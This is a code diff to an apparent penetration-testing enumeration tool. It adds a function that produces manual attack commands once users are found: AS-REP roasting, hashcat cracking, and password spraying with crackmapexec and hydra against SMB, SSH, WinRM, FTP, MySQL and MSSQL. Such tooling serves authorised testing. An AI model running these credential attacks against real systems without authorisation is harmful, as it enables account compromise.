@@ -72,6 +72,7 @@ def run(target: str, session, dry_run: bool = False) -> None:
     _parse_domain_info(smb_dir, session, log)
     _parse_signing(smb_dir, session, log)
     _parse_smbv1(smb_dir, session, log)
+    _generate_spray_hints(session, log)
 
     log.info("SMB module complete.")
 
@@ -338,3 +339,79 @@ def _parse_smbv1(smb_dir: Path, session, log) -> None:
             break
 
 
+def _generate_spray_hints(session, log) -> None:
+    """
+    When users have been discovered, inject manual spray commands as notes.
+    Ordering: password policy check FIRST, then per-service spray hints.
+    Nothing is run automatically — all entries land in the [MANUAL] section.
+    """
+    if not session.info.users_found:
+        return
+
+    ip         = session.info.ip
+    domain     = session.info.domain or ""
+    users_file = session.target_dir / "users.txt"
+    uf         = str(users_file)
+    ldap_dir   = session.target_dir / "ldap"
+
+    # Password policy MUST be checked before ANY spray to avoid lockouts
+    session.add_note(
+        f"[MANUAL] Password policy check (before spraying): "
+        f"crackmapexec smb {ip} --pass-pol"
+    )
+    log.info("Spray hints added: %d users discovered — policy check + per-service commands",
+             len(session.info.users_found))
+
+    # AS-REP Roasting — no creds needed, safe to run
+    if domain:
+        session.add_note(
+            f"[MANUAL] AS-REP Roasting (no pre-auth accounts): "
+            f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass "
+            f"-usersfile {uf} -format hashcat "
+            f"-outputfile {ldap_dir}/asrep_hashes.txt"
+        )
+        session.add_note(
+            f"[MANUAL] Crack AS-REP hashes: "
+            f"hashcat -m 18200 {ldap_dir}/asrep_hashes.txt "
+            f"/usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule"
+        )
+
+    # Per-service spray — only for ports that are actually open
+    open_ports = session.info.open_ports
+    if 445 in open_ports or 139 in open_ports:
+        session.add_note(
+            f"[MANUAL] SMB spray: "
+            f"crackmapexec smb {ip} -u {uf} "
+            f"-p /usr/share/wordlists/rockyou.txt --no-bruteforce --continue-on-success"
+        )
+    if 22 in open_ports:
+        session.add_note(
+            f"[MANUAL] SSH spray (rate-limited): "
+            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3"
+        )
+    if 5985 in open_ports or 5986 in open_ports:
+        session.add_note(
+            f"[MANUAL] WinRM spray: "
+            f"crackmapexec winrm {ip} -u {uf} -p '<FOUND_PASSWORD>'"
+        )
+    if 21 in open_ports:
+        session.add_note(
+            f"[MANUAL] FTP cred test: "
+            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ftp://{ip}"
+        )
+    if 3306 in open_ports:
+        session.add_note(
+            f"[MANUAL] MySQL cred test: "
+            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt mysql://{ip}"
+        )
+    if 1433 in open_ports:
+        session.add_note(
+            f"[MANUAL] MSSQL cred test: "
+            f"crackmapexec mssql {ip} -u {uf} -p '<FOUND_PASSWORD>'"
+        )
+
+    # Credential reuse reminder
+    session.add_note(
+        f"[MANUAL] Credential reuse — test any found creds against all services: "
+        f"crackmapexec all {ip} -u '<USER>' -p '<PASS>'"
+    )
